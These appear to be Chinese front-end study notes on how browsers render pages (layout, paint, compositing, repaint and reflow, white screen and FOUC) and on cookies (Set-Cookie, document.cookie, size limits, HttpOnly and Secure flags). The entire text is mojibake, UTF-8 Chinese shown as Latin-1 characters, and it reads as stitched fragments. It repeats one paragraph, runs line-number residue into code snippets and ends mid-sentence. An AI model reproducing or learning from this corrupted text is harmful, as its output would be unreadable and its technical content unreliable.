display:none ï¼Œè¿™ä¸ªå…ƒç´ ä¸ä¼šå‡ºçŽ°åœ¨å¸ƒå±€æ ‘ä¸Šï¼Œä¼ªå…ƒç´ è™½ç„¶åœ¨ DOM æ ‘ä¸Šä¸å¯è§ï¼Œä½†æ˜¯åœ¨å¸ƒå±€æ ‘ä¸Šæ˜¯å¯è§çš„ã€‚ 7.ç»˜åˆ¶å„å…ƒç´ æµè§ˆå™¨å¼•æ“Žé€šè¿‡ DOM Tree å’Œ CSS Rule Tree æž„å»º Rendering Treeå³ä½¿çŸ¥é“äº†ä¸åŒå…ƒç´ çš„ä½ç½®åŠæ ·å¼ä¿¡æ¯ï¼Œæˆ‘ä»¬è¿˜éœ€è¦çŸ¥é“ä¸åŒå…ƒç´ çš„ç»˜åˆ¶å…ˆåŽé¡ºåºæ‰èƒ½æ­£ç¡®ç»˜åˆ¶å‡ºæ•´ä¸ªé¡µé¢ã€‚åœ¨ç»˜åˆ¶é˜¶æ®µï¼Œä¸»çº¿ç¨‹ä¼šéåŽ†å¸ƒå±€æ ‘ä»¥åˆ›å»ºç»˜åˆ¶è®°å½•ã€‚ç»˜åˆ¶è®°å½•å¯ä»¥çœ‹åšæ˜¯è®°å½•å„å…ƒç´ ç»˜åˆ¶å…ˆåŽé¡ºåºçš„ç¬”è®°ã€‚ 8.åˆæˆå¸§æœ€ç»ˆé€šè¿‡è°ƒç”¨Native GUI çš„ API ç»˜åˆ¶ç½‘é¡µç”»é¢ï¼Œç§°ä¸º Paintå¤åˆæ˜¯ä¸€ç§åˆ†å‰²é¡µé¢ä¸ºä¸åŒçš„å±‚ï¼Œå¹¶å•ç‹¬æ …æ ¼åŒ–ï¼ŒéšåŽç»„åˆä¸ºå¸§çš„æŠ€æœ¯ã€‚ä¸åŒå±‚çš„ç»„åˆç”± compositor çº¿ç¨‹ï¼ˆåˆæˆå™¨çº¿ç¨‹ï¼‰å®Œæˆã€‚ä¸»çº¿ç¨‹ä¼šéåŽ†å¸ƒå±€æ ‘æ¥åˆ›å»ºå±‚æ ‘ï¼ˆlayer treeï¼‰ï¼Œæ·»åŠ äº† will-change CSS å±žæ€§çš„å…ƒç´ ï¼Œä¼šè¢«çœ‹åšå•ç‹¬çš„ä¸€å±‚ï¼Œ z-index 9.äº‹ä»¶å¤„ç† åœ¨æž„å»ºRendering Treeçš„åŒæ—¶ï¼Œç”ŸæˆJavascript è„šæœ¬æ–‡ä»¶åŠ è½½åŽï¼Œ é€šè¿‡ DOM API å’Œ CSSOM API æ¥æ“ä½œ DOM Tree å’Œ CSS Rule Treeäº‹ä»¶å‘ç”Ÿæ—¶ï¼Œæµè§ˆå™¨è¿›ç¨‹ä¼šå‘é€äº‹ä»¶ç±»åž‹åŠç›¸åº”çš„åæ ‡ç»™æ¸²æŸ“è¿›ç¨‹ï¼Œæ¸²æŸ“è¿›ç¨‹éšåŽæ‰¾åˆ°äº‹ä»¶å¯¹è±¡å¹¶æ‰§è¡Œæ‰€æœ‰ç»‘å®šåœ¨å…¶ä¸Šçš„ç›¸å…³äº‹ä»¶å¤„ç†å‡½æ•°ã€‚ä»¶å§”æ‰˜ï¼ŒåŸºäºŽäº‹ä»¶å†’æ³¡ï¼Œæˆ‘ä»¬å¸¸å¸¸åœ¨æœ€é¡¶å±‚ç»‘å®šäº‹ä»¶ï¼š 12345document.body.addEventListener(&apos;touchstart&apos;, event =&gt; &#123; if (event.target === area) &#123; event.preventDefault(); &#125;&#125;); äº‹ä»¶åˆ†æ³•deligation Repaintå½“å…ƒç´ æ”¹å˜çš„æ—¶å€™ï¼Œå°†ä¸ä¼šå½±å“å…ƒç´ åœ¨é¡µé¢å½“ä¸­çš„ä½ç½®ï¼ˆæ¯”å¦‚ background-color, border-color, visibilityï¼‰ï¼Œæµè§ˆå™¨ä»…ä»…ä¼šåº”ç”¨æ–°çš„æ ·å¼é‡ç»˜æ­¤å…ƒç´ ï¼Œæ­¤è¿‡ç¨‹ç§°ä¸º Repaintã€‚ é‡ç»˜:å½“render treeä¸­çš„ä¸€äº›å…ƒç´ éœ€è¦æ›´æ–°å±žæ€§ï¼Œè€Œè¿™äº›å±žæ€§åªæ˜¯å½±å“å…ƒç´ çš„å¤–è§‚ã€é£Žæ ¼ï¼Œè€Œä¸ä¼šå½±å“å¸ƒå±€çš„ï¼Œæ¯”å¦‚background-colorã€‚ Reflowå½“å…ƒç´ æ”¹å˜çš„æ—¶å€™ï¼Œå°†ä¼šå½±å“æ–‡æ¡£å†…å®¹æˆ–ç»“æž„ï¼Œæˆ–å…ƒç´ ä½ç½®ï¼Œæ­¤è¿‡ç¨‹ç§°ä¸º Reflowã€‚ï¼ˆ HTML ä½¿ç”¨çš„æ˜¯ flow based layout ï¼Œä¹Ÿå°±æ˜¯æµå¼å¸ƒå±€ï¼Œæ‰€ä»¥ï¼Œå¦‚æžœæŸå…ƒä»¶çš„å‡ ä½•å°ºå¯¸å‘ç”Ÿäº†å˜åŒ–ï¼Œéœ€è¦é‡æ–°å¸ƒå±€ï¼Œä¹Ÿå°±å« Reflowã€‚ï¼‰ å›žæµ:å½“render treeä¸­çš„ä¸€éƒ¨åˆ†(æˆ–å…¨éƒ¨)å› ä¸ºå…ƒç´ çš„è§„æ¨¡å°ºå¯¸ã€å¸ƒå±€ã€éšè—ç­‰æ”¹å˜è€Œéœ€è¦é‡æ–°æž„å»ºå›žæµå¿…å®šä¼šå‘ç”Ÿé‡ç»˜ï¼Œé‡ç»˜ä¸ä¸€å®šä¼šå¼•å‘å›žæµã€‚é‡ç»˜å’Œå›žæµä¼šåœ¨æˆ‘ä»¬è®¾ç½®èŠ‚ç‚¹æ ·å¼æ—¶é¢‘ç¹å‡ºçŽ°ï¼ŒåŒæ—¶ä¹Ÿä¼šå¾ˆå¤§ç¨‹åº¦ä¸Šå½±å“æ€§èƒ½ã€‚å›žæµæ‰€éœ€çš„æˆæœ¬æ¯”é‡ç»˜é«˜çš„å¤šï¼Œæ”¹å˜çˆ¶èŠ‚ç‚¹é‡Œçš„å­èŠ‚ç‚¹å¾ˆå¯èƒ½ä¼šå¯¼è‡´çˆ¶èŠ‚ç‚¹çš„ä¸€ç³»åˆ—å›žæµã€‚ 1ï¼‰å¸¸è§å¼•èµ·å›žæµå±žæ€§å’Œæ–¹æ³•ä»»ä½•ä¼šæ”¹å˜å…ƒç´ å‡ ä½•ä¿¡æ¯(å…ƒç´ çš„ä½ç½®å’Œå°ºå¯¸å¤§å°)çš„æ“ä½œï¼Œéƒ½ä¼šè§¦å‘å›žæµï¼Œ æ·»åŠ æˆ–è€…åˆ é™¤å¯è§çš„DOMå…ƒç´ ï¼›å…ƒç´ å°ºå¯¸æ”¹å˜â€”â€”è¾¹è·ã€å¡«å……ã€è¾¹æ¡†ã€å®½åº¦å’Œé«˜åº¦å†…å®¹å˜åŒ–ï¼Œæ¯”å¦‚ç”¨æˆ·åœ¨inputæ¡†ä¸­è¾“å…¥æ–‡å­—æµè§ˆå™¨çª—å£å°ºå¯¸æ”¹å˜â€”â€”resizeäº‹ä»¶å‘ç”Ÿæ—¶è®¡ç®— offsetWidth å’Œ offsetHeight å±žæ€§è®¾ç½® style å±žæ€§çš„å€¼ é‡æŽ’width height margin padding display border position overflow clientWidth/Height/Top/Left offsetWidth/Height/Top/Left scrollWidth/Height/Top/Left scrollIntoView ScrollTo scrollIntoViewIfNeeded getComputedStyle getBoundingClientRect é‡ç»˜color border-style viisbilitybackground text-decoration background-image background-position background-repeat outline-color outline outline-style border-radius outline-width box-shadow background-size ä¸åŒçš„æµè§ˆå™¨å¯¹äºŽCSSå’ŒHTMLçš„å¤„ç†æ–¹å¼ä¸åŒå¦‚æžœæœ‰çš„æµè§ˆå™¨çš„æ¸²æŸ“å¼•æ“Žæ˜¯éœ€è¦ç­‰å¾…CSSåŠ è½½å®Œæˆä¹‹åŽï¼Œå¯¹HTMLå…ƒç´ è¿›è¡Œæ¸²æŸ“å’Œå±•ç¤ºçš„ï¼Œé‚£ä¹ˆåœ¨CSSåŠ è½½å®Œæˆä¹‹å‰ï¼Œé¡µé¢ä¸Šä¸æœ‰ä»»ä½•ä¿¡æ¯ï¼Œè¿™ç§çŽ°è±¡ç§°ä¸ºç™½å±ï¼ˆè°·æ­ŒChromeå’Œè‹¹æžœSafariï¼‰è€Œæœ‰çš„æ˜¯å…ˆå¯¹HTMLå…ƒç´ è¿›è¡Œå±•ç¤ºï¼Œç„¶åŽç­‰å¾…CSSåŠ è½½å®Œæˆä¹‹åŽé‡æ–°å¯¹æ ·å¼è¿›è¡Œä¿®æ”¹ï¼Œé‚£ä¹ˆåœ¨CSSåŠ è½½å®Œä¹‹å‰ï¼Œä¼šé¦–å…ˆåœ¨é¡µé¢ä¸Šæ˜¾ç¤ºæ²¡æœ‰ä»»ä½•CSSæ¸²æŸ“çš„ä¿¡æ¯ï¼Œè¿™ç§çŽ°è±¡ç§°ä¸ºFOUC(æ— æ ·å¼å†…å®¹é—ªçƒ)ï¼ˆIEå’ŒFirefoxç«ç‹ï¼‰ é—®é¢˜å››ï¼šä¸ºä»€ä¹ˆæ“ä½œ DOM æ…¢å› ä¸º DOM æ˜¯å±žäºŽæ¸²æŸ“å¼•æ“Žä¸­çš„ä¸œè¥¿ï¼Œè€Œ JS åˆæ˜¯ JS å¼•æ“Žä¸­çš„ä¸œè¥¿ã€‚å½“æˆ‘ä»¬é€šè¿‡ JS æ“ä½œ DOM çš„æ—¶å€™ï¼Œå…¶å®žè¿™ä¸ªæ“ä½œæ¶‰åŠåˆ°äº†ä¸¤ä¸ªçº¿ç¨‹ä¹‹é—´çš„é€šä¿¡ï¼Œé‚£ä¹ˆåŠ¿å¿…ä¼šå¸¦æ¥ä¸€äº›æ€§èƒ½ä¸Šçš„æŸè€—ã€‚æ“ä½œ DOM æ¬¡æ•°ä¸€å¤šï¼Œä¹Ÿå°±ç­‰åŒäºŽä¸€ç›´åœ¨è¿›è¡Œçº¿ç¨‹ä¹‹é—´çš„é€šä¿¡ï¼Œå¹¶ä¸”æ“ä½œ DOM å¯èƒ½è¿˜ä¼šå¸¦æ¥é‡ç»˜å›žæµçš„æƒ…å†µï¼Œæ‰€ä»¥ä¹Ÿå°±å¯¼è‡´äº†æ€§èƒ½ä¸Šçš„é—®é¢˜ã€‚ é—®é¢˜äº”ï¼šæ¸²æŸ“é¡µé¢æ—¶å¸¸è§å“ªäº›ä¸è‰¯çŽ°è±¡ï¼Ÿç”±äºŽæµè§ˆå™¨çš„æ¸²æŸ“æœºåˆ¶ä¸åŒï¼Œåœ¨æ¸²æŸ“é¡µé¢æ—¶ä¼šå‡ºçŽ°ä¸¤ç§å¸¸è§çš„ä¸è‰¯çŽ°è±¡â€”-ç™½å±é—®é¢˜å’ŒFOUSï¼ˆæ— æ ·å¼å†…å®¹é—ªçƒï¼‰ FOUCï¼šç”±äºŽæµè§ˆå™¨æ¸²æŸ“æœºåˆ¶ï¼ˆæ¯”å¦‚firefoxï¼‰ï¼Œå†CSSåŠ è½½ä¹‹å‰ï¼Œå…ˆå‘ˆçŽ°äº†HTMLï¼Œå°±ä¼šå¯¼è‡´å±•ç¤ºå‡ºæ— æ ·å¼å†…å®¹ï¼Œç„¶åŽæ ·å¼çªç„¶å‘ˆçŽ°çš„çŽ°è±¡ï¼› ç™½å±ï¼šæœ‰äº›æµè§ˆå™¨æ¸²æŸ“æœºåˆ¶ï¼ˆæ¯”å¦‚chromeï¼‰è¦å…ˆæž„å»ºDOMæ ‘å’ŒCSSOMæ ‘ï¼Œæž„å»ºå®ŒæˆåŽå†è¿›è¡Œæ¸²æŸ“ï¼Œå¦‚æžœCSSéƒ¨åˆ†æ”¾åœ¨HTMLå°¾éƒ¨ï¼Œç”±äºŽCSSæœªåŠ è½½å®Œæˆï¼Œæµè§ˆå™¨è¿Ÿè¿Ÿæœªæ¸²æŸ“ï¼Œä»Žè€Œå¯¼è‡´ç™½å±ï¼›ä¹Ÿå¯èƒ½æ˜¯æŠŠjsæ–‡ä»¶æ”¾åœ¨å¤´éƒ¨ï¼Œè„šæœ¬ä¼šé˜»å¡žåŽé¢å†…å®¹çš„å‘ˆçŽ°ï¼Œè„šæœ¬ä¼šé˜»å¡žå…¶åŽç»„ä»¶çš„ä¸‹è½½ï¼Œå‡ºçŽ°ç™½å±é—®é¢˜ã€‚ ç™½å±å’ŒFOUCçŽ°è±¡ ä¸åŒçš„æµè§ˆå™¨å¯¹äºŽCSSå’ŒHTMLçš„å¤„ç†æ–¹å¼ä¸åŒ å¦‚æžœæœ‰çš„æµè§ˆå™¨çš„æ¸²æŸ“å¼•æ“Žæ˜¯éœ€è¦ç­‰å¾…CSSåŠ è½½å®Œæˆä¹‹åŽï¼Œå¯¹HTMLå…ƒç´ è¿›è¡Œæ¸²æŸ“å’Œå±•ç¤ºçš„ï¼Œé‚£ä¹ˆåœ¨CSSåŠ è½½å®Œæˆä¹‹å‰ï¼Œé¡µé¢ä¸Šä¸æœ‰ä»»ä½•ä¿¡æ¯ï¼Œè¿™ç§çŽ°è±¡ç§°ä¸ºç™½å±ï¼ˆè°·æ­ŒChromeå’Œè‹¹æžœSafariï¼‰ è€Œæœ‰çš„æ˜¯å…ˆå¯¹HTMLå…ƒç´ è¿›è¡Œå±•ç¤ºï¼Œç„¶åŽç­‰å¾…CSSåŠ è½½å®Œæˆä¹‹åŽé‡æ–°å¯¹æ ·å¼è¿›è¡Œä¿®æ”¹ï¼Œé‚£ä¹ˆåœ¨CSSåŠ è½½å®Œä¹‹å‰ï¼Œä¼šé¦–å…ˆåœ¨é¡µé¢ä¸Šæ˜¾ç¤ºæ²¡æœ‰ä»»ä½•CSSæ¸²æŸ“çš„ä¿¡æ¯ï¼Œè¿™ç§çŽ°è±¡ç§°ä¸ºFOUC(æ— æ ·å¼å†…å®¹é—ªçƒ)ï¼ˆIEå’ŒFirefoxç«ç‹ï¼‰ å·¥ä½œåŽŸç† æ¸²æŸ“APIå­˜å‚¨ä¸€ã€Cookie1. Cookieçš„æ¥æºCookie çš„æœ¬èŒå·¥ä½œå¹¶éžæœ¬åœ°å­˜å‚¨ï¼Œè€Œæ˜¯â€œç»´æŒçŠ¶æ€â€ã€‚ å› ä¸ºHTTPåè®®æ˜¯æ— çŠ¶æ€çš„ï¼ŒHTTPåè®®è‡ªèº«ä¸å¯¹è¯·æ±‚å’Œå“åº”ä¹‹é—´çš„é€šä¿¡çŠ¶æ€è¿›è¡Œä¿å­˜ï¼Œé€šä¿—æ¥è¯´ï¼ŒæœåŠ¡å™¨ä¸çŸ¥é“ç”¨æˆ·ä¸Šä¸€æ¬¡åšäº†ä»€ä¹ˆï¼Œè¿™ä¸¥é‡é˜»ç¢äº†äº¤äº’å¼Webåº”ç”¨ç¨‹åºçš„å®žçŽ°ã€‚åœ¨å…¸åž‹çš„ç½‘ä¸Šè´­ç‰©åœºæ™¯ä¸­ï¼Œç”¨æˆ·æµè§ˆäº†å‡ ä¸ªé¡µé¢ï¼Œä¹°äº†ä¸€ç›’é¥¼å¹²å’Œä¸¤ç“¶é¥®æ–™ã€‚æœ€åŽç»“å¸æ—¶ï¼Œç”±äºŽHTTPçš„æ— çŠ¶æ€æ€§ï¼Œä¸é€šè¿‡é¢å¤–çš„æ‰‹æ®µï¼ŒæœåŠ¡å™¨å¹¶ä¸çŸ¥é“ç”¨æˆ·åˆ°åº•ä¹°äº†ä»€ä¹ˆï¼ŒäºŽæ˜¯å°±è¯žç”Ÿäº†Cookieã€‚å®ƒå°±æ˜¯ç”¨æ¥ç»•å¼€HTTPçš„æ— çŠ¶æ€æ€§çš„â€œé¢å¤–æ‰‹æ®µâ€ä¹‹ä¸€ã€‚æœåŠ¡å™¨å¯ä»¥è®¾ç½®æˆ–è¯»å–Cookiesä¸­åŒ…å«ä¿¡æ¯ï¼Œå€Ÿæ­¤ç»´æŠ¤ç”¨æˆ·è·ŸæœåŠ¡å™¨ä¼šè¯ä¸­çš„çŠ¶æ€ã€‚ æˆ‘ä»¬å¯ä»¥æŠŠCookie ç†è§£ä¸ºä¸€ä¸ªå­˜å‚¨åœ¨æµè§ˆå™¨é‡Œçš„ä¸€ä¸ªå°å°çš„æ–‡æœ¬æ–‡ä»¶ï¼Œå®ƒé™„ç€åœ¨ HTTP è¯·æ±‚ä¸Šï¼Œåœ¨æµè§ˆå™¨å’ŒæœåŠ¡å™¨ä¹‹é—´â€œé£žæ¥é£žåŽ»â€ã€‚å®ƒå¯ä»¥æºå¸¦ç”¨æˆ·ä¿¡æ¯ï¼Œå½“æœåŠ¡å™¨æ£€æŸ¥ Cookie çš„æ—¶å€™ï¼Œä¾¿å¯ä»¥èŽ·å–åˆ°å®¢æˆ·ç«¯çš„çŠ¶æ€ã€‚ åœ¨åˆšæ‰çš„è´­ç‰©åœºæ™¯ä¸­ï¼Œå½“ç”¨æˆ·é€‰è´­äº†ç¬¬ä¸€é¡¹å•†å“ï¼ŒæœåŠ¡å™¨åœ¨å‘ç”¨æˆ·å‘é€ç½‘é¡µçš„åŒæ—¶ï¼Œè¿˜å‘é€äº†ä¸€æ®µCookieï¼Œè®°å½•ç€é‚£é¡¹å•†å“çš„ä¿¡æ¯ã€‚å½“ç”¨æˆ·è®¿é—®å¦ä¸€ä¸ªé¡µé¢ï¼Œæµè§ˆå™¨ä¼šæŠŠCookieå‘é€ç»™æœåŠ¡å™¨ï¼ŒäºŽæ˜¯æœåŠ¡å™¨çŸ¥é“ä»–ä¹‹å‰é€‰è´­äº†ä»€ä¹ˆã€‚ç”¨æˆ·ç»§ç»­é€‰è´­é¥®æ–™ï¼ŒæœåŠ¡å™¨å°±åœ¨åŽŸæ¥é‚£æ®µCookieé‡Œè¿½åŠ æ–°çš„å•†å“ä¿¡æ¯ã€‚ç»“å¸æ—¶ï¼ŒæœåŠ¡å™¨è¯»å–å‘é€æ¥çš„Cookieå°±è¡Œäº†ã€‚ 2. ä»€ä¹ˆæ˜¯CookieåŠåº”ç”¨åœºæ™¯CookieæŒ‡æŸäº›ç½‘ç«™ä¸ºäº†è¾¨åˆ«ç”¨æˆ·èº«ä»½è€Œå‚¨å­˜åœ¨ç”¨æˆ·æœ¬åœ°ç»ˆç«¯ä¸Šçš„æ•°æ®(é€šå¸¸ç»è¿‡åŠ å¯†)ã€‚ cookieæ˜¯æœåŠ¡ç«¯ç”Ÿæˆï¼Œå®¢æˆ·ç«¯è¿›è¡Œç»´æŠ¤å’Œå­˜å‚¨ã€‚é€šè¿‡cookie,å¯ä»¥è®©æœåŠ¡å™¨çŸ¥é“è¯·æ±‚æ˜¯æ¥æºå“ªä¸ªå®¢æˆ·ç«¯ï¼Œå°±å¯ä»¥è¿›è¡Œå®¢æˆ·ç«¯çŠ¶æ€çš„ç»´æŠ¤ï¼Œæ¯”å¦‚ç™»é™†åŽåˆ·æ–°ï¼Œè¯·æ±‚å¤´å°±ä¼šæºå¸¦ç™»é™†æ—¶response headerä¸­çš„set-cookie,WebæœåŠ¡å™¨æŽ¥åˆ°è¯·æ±‚æ—¶ä¹Ÿèƒ½è¯»å‡ºcookieçš„å€¼ï¼Œæ ¹æ®cookieå€¼çš„å†…å®¹å°±å¯ä»¥åˆ¤æ–­å’Œæ¢å¤ä¸€äº›ç”¨æˆ·çš„ä¿¡æ¯çŠ¶æ€ã€‚ å¦‚ä¸Šå›¾æ‰€ç¤ºï¼ŒCookie ä»¥é”®å€¼å¯¹çš„å½¢å¼å­˜åœ¨ã€‚ å…¸åž‹çš„åº”ç”¨åœºæ™¯æœ‰ï¼š è®°ä½å¯†ç ï¼Œä¸‹æ¬¡è‡ªåŠ¨ç™»å½•ã€‚ è´­ç‰©è½¦åŠŸèƒ½ã€‚ è®°å½•ç”¨æˆ·æµè§ˆæ•°æ®ï¼Œè¿›è¡Œå•†å“ï¼ˆå¹¿å‘Šï¼‰æŽ¨èã€‚ 3. Cookieçš„åŽŸç†åŠç”Ÿæˆæ–¹å¼Cookieçš„åŽŸç† ç¬¬ä¸€æ¬¡è®¿é—®ç½‘ç«™çš„æ—¶å€™ï¼Œæµè§ˆå™¨å‘å‡ºè¯·æ±‚ï¼ŒæœåŠ¡å™¨å“åº”è¯·æ±‚åŽï¼Œä¼šåœ¨å“åº”å¤´é‡Œé¢æ·»åŠ ä¸€ä¸ªSet-Cookieé€‰é¡¹ï¼Œå°†cookieæ”¾å…¥åˆ°å“åº”è¯·æ±‚ä¸­ï¼Œåœ¨æµè§ˆå™¨ç¬¬äºŒæ¬¡å‘è¯·æ±‚çš„æ—¶å€™ï¼Œä¼šé€šè¿‡Cookieè¯·æ±‚å¤´éƒ¨å°†Cookieä¿¡æ¯å‘é€ç»™æœåŠ¡å™¨ï¼ŒæœåŠ¡ç«¯ä¼šè¾¨åˆ«ç”¨æˆ·èº«ä»½ï¼Œå¦å¤–ï¼ŒCookieçš„è¿‡æœŸæ—¶é—´ã€åŸŸã€è·¯å¾„ã€æœ‰æ•ˆæœŸã€é€‚ç”¨ç«™ç‚¹éƒ½å¯ä»¥æ ¹æ®éœ€è¦æ¥æŒ‡å®šã€‚ Cookieçš„ç”Ÿæˆæ–¹å¼ä¸»è¦æœ‰ä¸¤ç§ï¼š ç”Ÿæˆæ–¹å¼ä¸€ï¼šhttp response headerä¸­çš„set-cookie æˆ‘ä»¬å¯ä»¥é€šè¿‡å“åº”å¤´é‡Œçš„ Set-Cookie æŒ‡å®šè¦å­˜å‚¨çš„ Cookie å€¼ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œdomain è¢«è®¾ç½®ä¸ºè®¾ç½® Cookie é¡µé¢çš„ä¸»æœºåï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æ‰‹åŠ¨è®¾ç½® domain çš„å€¼ã€‚ 1Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2018 07:28:00 GMT;//å¯ä»¥æŒ‡å®šä¸€ä¸ªç‰¹å®šçš„è¿‡æœŸæ—¶é—´ï¼ˆExpiresï¼‰æˆ–æœ‰æ•ˆæœŸï¼ˆMax-Ageï¼‰ å½“Cookieçš„è¿‡æœŸæ—¶é—´è¢«è®¾å®šæ—¶ï¼Œè®¾å®šçš„æ—¥æœŸå’Œæ—¶é—´åªä¸Žå®¢æˆ·ç«¯ç›¸å…³ï¼Œè€Œä¸æ˜¯æœåŠ¡ç«¯ã€‚ å†…å­˜cookieï¼Œæ˜¯æŒ‡æ²¡æœ‰è®¾åœ¨cookieçš„Expiresçš„å±žæ€§ï¼Œæ­¤æ—¶cookieå°†åœç•™åœ¨å®¢æˆ·ç«¯çš„å†…å­˜ä¸­ï¼Œåªæœ‰åœ¨è¯¥IEçª—å£ä¸­ä»Žâ€œæ–‡ä»¶ï¼æ–°å»ºï¼ çª—å£â€æ‰“å¼€çš„æ–°çš„IEçª—å’Œç”±formçš„targetå±žæ€§ä¸º_blankäº§ç”Ÿçš„æ–°çš„IEçª—å£æ‰å…±äº«åŒä¸€ä¸ªcookieä¿¡æ¯ã€‚IEï¼ŒChomeçš„é€‰é¡¹å¡éƒ½å…±äº«åŒä¸€ä¸ªcookieä¿¡æ¯ã€‚ ç¡¬ç›˜cookieï¼Œæ˜¯æŒ‡åœ¨ä½ è®¾ç½®äº†cookieçš„Expireså±žæ€§ï¼Œæ­¤æ—¶cookieå°†ä¿å­˜åˆ°ä½ çš„ç¡¬ç›˜ä¸Šã€‚æ­¤æ—¶æ‰€æœ‰çš„çª—å£å°†å…±äº«åŒä¸€ä¸ªåå­—çš„cookieã€‚ ç”Ÿæˆæ–¹å¼äºŒï¼šjsä¸­å¯ä»¥é€šè¿‡document.cookieå¯ä»¥è¯»å†™cookieï¼Œä»¥é”®å€¼å¯¹çš„å½¢å¼å±•ç¤º ä¾‹å¦‚æˆ‘ä»¬åœ¨æŽ˜é‡‘ç¤¾åŒºæŽ§åˆ¶å°è¾“å…¥ä»¥ä¸‹ä¸‰å¥ä»£ç ï¼Œä¾¿å¯ä»¥åœ¨Chrome çš„ Application é¢æ¿æŸ¥çœ‹ç”Ÿæˆçš„cookie: 123document.cookie="userName=hello"document.cookie="gender=male"document.cookie='age=20;domain=.baidu.com' ä»Žä¸Šå›¾ä¸­æˆ‘ä»¬å¯ä»¥å¾—å‡ºï¼š Domain æ ‡è¯†æŒ‡å®šäº†å“ªäº›åŸŸåå¯ä»¥æŽ¥å—Cookieã€‚å¦‚æžœæ²¡æœ‰è®¾ç½®domainï¼Œå°±ä¼šè‡ªåŠ¨ç»‘å®šåˆ°æ‰§è¡Œè¯­å¥çš„å½“å‰åŸŸã€‚ å¦‚æžœè®¾ç½®ä¸ºâ€.baidu.comâ€,åˆ™æ‰€æœ‰ä»¥â€baidu.comâ€ç»“å°¾çš„åŸŸåéƒ½å¯ä»¥è®¿é—®è¯¥Cookieï¼Œæ‰€ä»¥åœ¨æŽ˜é‡‘ç¤¾åŒºä¸Šè¯»å–ä¸åˆ°ç¬¬ä¸‰æ¡ä»£ç å­˜å‚¨Cookieå€¼ã€‚ 4. Cookieçš„ç¼ºé™· Cookie ä¸å¤Ÿå¤§ Cookieçš„å¤§å°é™åˆ¶åœ¨4KBå·¦å³ï¼Œå¯¹äºŽå¤æ‚çš„å­˜å‚¨éœ€æ±‚æ¥è¯´æ˜¯ä¸å¤Ÿç”¨çš„ã€‚å½“ Cookie è¶…è¿‡ 4KB æ—¶ï¼Œå®ƒå°†é¢ä¸´è¢«è£åˆ‡çš„å‘½è¿ã€‚è¿™æ ·çœ‹æ¥ï¼ŒCookie åªèƒ½ç”¨æ¥å­˜å–å°‘é‡çš„ä¿¡æ¯ã€‚æ­¤å¤–å¾ˆå¤šæµè§ˆå™¨å¯¹ä¸€ä¸ªç«™ç‚¹çš„cookieä¸ªæ•°ä¹Ÿæ˜¯æœ‰é™åˆ¶çš„ã€‚ è¿™é‡Œéœ€æ³¨æ„ï¼šå„æµè§ˆå™¨çš„cookieæ¯ä¸€ä¸ªname=valueçš„valueå€¼å¤§æ¦‚åœ¨4kï¼Œæ‰€ä»¥4kå¹¶ä¸æ˜¯ä¸€ä¸ªåŸŸåä¸‹æ‰€æœ‰çš„cookieå…±äº«çš„,è€Œæ˜¯ä¸€ä¸ªnameçš„å¤§å°ã€‚ è¿‡å¤šçš„ Cookie ä¼šå¸¦æ¥å·¨å¤§çš„æ€§èƒ½æµªè´¹ Cookie æ˜¯ç´§è·ŸåŸŸåçš„ã€‚åŒä¸€ä¸ªåŸŸåä¸‹çš„æ‰€æœ‰è¯·æ±‚ï¼Œéƒ½ä¼šæºå¸¦ Cookieã€‚å¤§å®¶è¯•æƒ³ï¼Œå¦‚æžœæˆ‘ä»¬æ­¤åˆ»ä»…ä»…æ˜¯è¯·æ±‚ä¸€å¼ å›¾ç‰‡æˆ–è€…ä¸€ä¸ª CSS æ–‡ä»¶ï¼Œæˆ‘ä»¬ä¹Ÿè¦æºå¸¦ä¸€ä¸ª Cookie è·‘æ¥è·‘åŽ»ï¼ˆå…³é”®æ˜¯ Cookie é‡Œå­˜å‚¨çš„ä¿¡æ¯å¹¶ä¸éœ€è¦ï¼‰ï¼Œè¿™æ˜¯ä¸€ä»¶å¤šä¹ˆåŠ³æ°‘ä¼¤è´¢çš„äº‹æƒ…ã€‚Cookie è™½ç„¶å°ï¼Œè¯·æ±‚å´å¯ä»¥æœ‰å¾ˆå¤šï¼Œéšç€è¯·æ±‚çš„å åŠ ï¼Œè¿™æ ·çš„ä¸å¿…è¦çš„ Cookie å¸¦æ¥çš„å¼€é”€å°†æ˜¯æ— æ³•æƒ³è±¡çš„ã€‚ cookieæ˜¯ç”¨æ¥ç»´æŠ¤ç”¨æˆ·ä¿¡æ¯çš„ï¼Œè€ŒåŸŸå(domain)ä¸‹æ‰€æœ‰è¯·æ±‚éƒ½ä¼šæºå¸¦cookieï¼Œä½†å¯¹äºŽé™æ€æ–‡ä»¶çš„è¯·æ±‚ï¼Œæºå¸¦cookieä¿¡æ¯æ ¹æœ¬æ²¡æœ‰ç”¨ï¼Œæ­¤æ—¶å¯ä»¥é€šè¿‡cdnï¼ˆå­˜å‚¨é™æ€æ–‡ä»¶çš„ï¼‰çš„åŸŸåå’Œä¸»ç«™çš„åŸŸååˆ†å¼€æ¥è§£å†³ã€‚ ç”±äºŽåœ¨HTTPè¯·æ±‚ä¸­çš„Cookieæ˜¯æ˜Žæ–‡ä¼ é€’çš„ï¼Œæ‰€ä»¥å®‰å…¨æ€§æˆé—®é¢˜ï¼Œé™¤éžç”¨HTTPSã€‚ 5. Cookieä¸Žå®‰å…¨å¯¹äºŽ cookie æ¥è¯´ï¼Œæˆ‘ä»¬è¿˜éœ€è¦æ³¨æ„å®‰å…¨æ€§ã€‚ HttpOnly ä¸æ”¯æŒè¯»å†™ï¼Œæµè§ˆå™¨ä¸å…è®¸è„šæœ¬æ“ä½œdocument.cookieåŽ»æ›´æ”¹cookieï¼Œ æ‰€ä»¥ä¸ºé¿å…è·¨åŸŸè„šæœ¬ (XSS) æ”»å‡»ï¼Œé€šè¿‡JavaScriptçš„ Document.cookie APIæ— æ³•è®¿é—®å¸¦æœ‰ HttpOnly æ ‡è®°çš„Cookieï¼Œå®ƒä»¬åªåº”è¯¥å‘é€ç»™æœåŠ¡ç«¯ã€‚å¦‚æžœåŒ…å«æœåŠ¡ç«¯ Session ä¿¡æ¯çš„ Cookie ä¸æƒ³è¢«å®¢æˆ·ç«¯ JavaScript è„šæœ¬è°ƒç”¨ï¼Œé‚£ä¹ˆå°±åº”è¯¥ä¸ºå…¶è®¾ç½® HttpOnly æ ‡è®°ã€‚ 1Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly æ ‡è®°ä¸º Secure 